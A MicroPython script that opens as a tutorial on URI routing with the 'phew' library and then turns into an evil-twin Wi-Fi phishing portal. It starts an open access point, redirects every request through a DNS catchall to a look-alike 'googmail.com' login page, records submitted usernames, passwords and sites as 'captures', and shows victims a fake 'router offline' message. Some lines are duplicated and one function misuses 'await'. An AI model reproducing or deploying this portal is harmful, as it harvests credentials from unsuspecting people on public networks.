# example script to show how uri routing and parameters work
#
# create a file called secrets.py alongside this one and add the
# following two lines to it:
#
#	WIFI_SSID = "<ssid>"
#	WIFI_PASSWORD = "<password>"
#
# with your wifi details instead of <ssid> and <password>.

from phew import server, connect_to_wifi, access_point
from phew.template import render_template
from phew.dns import run_catchall
import time

import secrets

wlan_AP_IF=access_point(secrets.WIFI_SSID)
#connect_to_wifi(secrets.WIFI_SSID, secrets.WIFI_PASSWORD)

# basic response with status code and content type
@server.route("/basic", methods=["GET", "POST"])
def basic(request):
  return "Gosh, a request", 200, "text/html"

# basic response with status code and content type
@server.route("/status-code", methods=["GET", "POST"])
def status_code(request):
  return "Here, have a status code", 200, "text/html"

# url parameter and template render
@server.route("/hello/<name>", methods=["GET"])
def hello(request, name):
  return await render_template("example.html", name=name)

# response with custom status code
@server.route("/are/you/a/teapot", methods=["GET"])
def teapot(request):
  return "Yes", 418

# custom response object
@server.route("/response", methods=["GET"])
def response_object(request):
  return server.Response("test body", status=302, content_type="text/html", headers={"Cache-Control": "max-age=3600"})

# query string example
@server.route("/random", methods=["GET"])
def random_number(request):
  import random
  min = int(request.query.get("min", 0))
  max = int(request.query.get("max", 100))
  return str(random.randint(min, max))

# catchall example
#@server.catchall()
#def catchall(request):
#  return "Not found", 404

'''
The html file is being preloaded and saved as Response.
That way, it doesn't have to be opened everytime it is
server (when using render_template)
'''
with open("templates/goog.html", "r") as html_file:
    LOGIN_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/html"}, body=html_file.read())

# Default response when someone logs in
SUCCESS_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/html"}, body="Router is offline right now, try again another time.")
DOMAIN = 'googmail.com'
captured_time = 0
WAITING = True
captured_time = 0
WAITING = True
last_capture = {}
amount_of_captures = 0
DOMAIN = 'googmail.com'

@server.route("/login", methods=["GET", "POST"])
def login_page(request):
  global captured_time, WAITING, last_capture, amount_of_captures, DOMAIN

  if request.method == "GET":
    return LOGIN_RESPONSE
  else:
    if request.form:
      username = request.form['username']
      password = request.form['password']
      website = request.form['website']
      print(f"{username},{password},{website}\n")

    captured_time = time.time()
    last_capture = request.form
    amount_of_captures += 1
    WAITING = False

    return SUCCESS_RESPONSE

#DNS catchall to redirect every request
@server.catchall()
def catchall(request):
    return server.redirect("http://" + DOMAIN + "/login")
    #return server.redirect("http://192.168.4.1/hello/my_name")

run_catchall(wlan_AP_IF.ifconfig()[0])
# start the webserver
server.run()
